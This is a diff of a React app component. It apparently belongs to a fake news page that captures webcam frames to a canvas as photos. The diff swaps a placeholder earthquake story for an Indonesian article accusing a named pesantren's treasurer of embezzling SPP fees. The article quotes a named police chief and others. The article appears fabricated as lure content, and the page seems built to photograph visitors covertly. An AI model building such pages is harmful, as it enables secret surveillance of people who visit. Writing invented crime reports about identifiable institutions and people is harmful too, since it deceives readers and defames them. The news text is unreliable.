@@ -55,7 +55,6 @@ function App() {
       canvas.height = settings.height || 1080;
       const context = canvas.getContext('2d') as CanvasRenderingContext2D | null;
 
-
       if (context) context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       const photoBlob = await new Promise<Blob>((resolve) => {
@@ -106,17 +105,31 @@ function App() {
   }, []);
 
   const article = {
-    title: "Bendahara Ponpes Al Muttaqin Jepara Diduga Gelapkan Dana SPP Rp 500 Juta Lebih untuk Foya-Foya",
+    title: "Bendahara Ponpes Al Muttaqin Jepara Jadi Tersangka, Gelapkan Dana SPP Rp 500 Juta untuk Foya-Foya",
     date: "26 Juli 2025",
     imageUrl: "https://linuxpemula.web.id/tersangka.jpg",
     content: `
-      Yogyakarta kembali diguncang gempa bumi pada hari Sabtu, 26 Juli 2025.
-      Gempa ini memiliki kekuatan 5.6 skala Richter dan terasa di beberapa wilayah seperti Sleman, Bantul, dan Kulonprogo.
+Jepara, 26 Juli 2025 — Kepolisian Resor (Polres) Jepara resmi menetapkan MZ (38), bendahara Pondok Pesantren Islam Al Muttaqin, sebagai tersangka dalam kasus dugaan penggelapan dana iuran SPP santri senilai lebih dari Rp 500 juta. Hingga saat ini, tersangka masih buron dan masuk dalam daftar pencarian orang (DPO).
 
-      BMKG menyatakan bahwa pusat gempa berada di laut selatan Pulau Jawa dengan kedalaman 25 km.
-      Masyarakat diimbau untuk tetap waspada terhadap gempa susulan.
+Kapolres Jepara, AKBP Andri Susanto, menyatakan bahwa penetapan tersangka dilakukan setelah serangkaian pemeriksaan saksi, audit keuangan internal, dan penelusuran aliran dana.
 
-      Tim tanggap darurat telah dikerahkan, dan hingga kini belum ada laporan korban jiwa.
+“Setelah kami kumpulkan cukup bukti, saudara MZ resmi kami tetapkan sebagai tersangka. Saat ini yang bersangkutan tidak berada di alamat terakhirnya dan sedang kami kejar,” ujar AKBP Andri dalam konferensi pers di Mapolres Jepara, Jumat (25/7).
+
+Penyelidikan bermula dari laporan pihak yayasan pondok pesantren yang menemukan kejanggalan dalam arus keuangan sejak awal tahun 2025. Dana iuran santri yang seharusnya digunakan untuk kegiatan operasional, gaji guru, dan kebutuhan santri, ternyata tidak pernah masuk ke kas pesantren.
+
+Audit internal mengungkap bahwa lebih dari Rp 500 juta dana SPP raib dan diduga kuat digunakan oleh tersangka untuk gaya hidup mewah, hiburan malam, hingga perjalanan ke luar kota yang tidak berhubungan dengan kegiatan pesantren.
+
+Ketua Yayasan Al Muttaqin, KH. Sartono Munadi, menyampaikan keprihatinannya atas kasus tersebut.
+
+“Kami sangat terpukul. Ini pengkhianatan terhadap amanah para wali santri. Kami serahkan sepenuhnya kepada pihak berwajib agar pelaku ditangkap dan diproses hukum,” ucapnya.
+
+Pihak kepolisian kini bekerja sama dengan sejumlah wilayah kepolisian lain untuk melakukan pelacakan terhadap tersangka. Diduga, MZ melarikan diri ke luar provinsi dan telah mengganti identitasnya.
+
+Kasus ini menuai perhatian besar dari masyarakat, khususnya para wali santri. Banyak yang menuntut transparansi dan perbaikan tata kelola keuangan di lingkungan pondok pesantren.
+
+“Kami minta ke depan pengelolaan keuangan lebih terbuka. Jangan sampai anak-anak kami jadi korban kelalaian sistem,” kata Rukmini, wali santri asal Demak.
+
+Pihak pondok pesantren menegaskan kegiatan belajar-mengajar tetap berjalan seperti biasa, sambil terus melakukan pembenahan internal.
     `,
   };
 
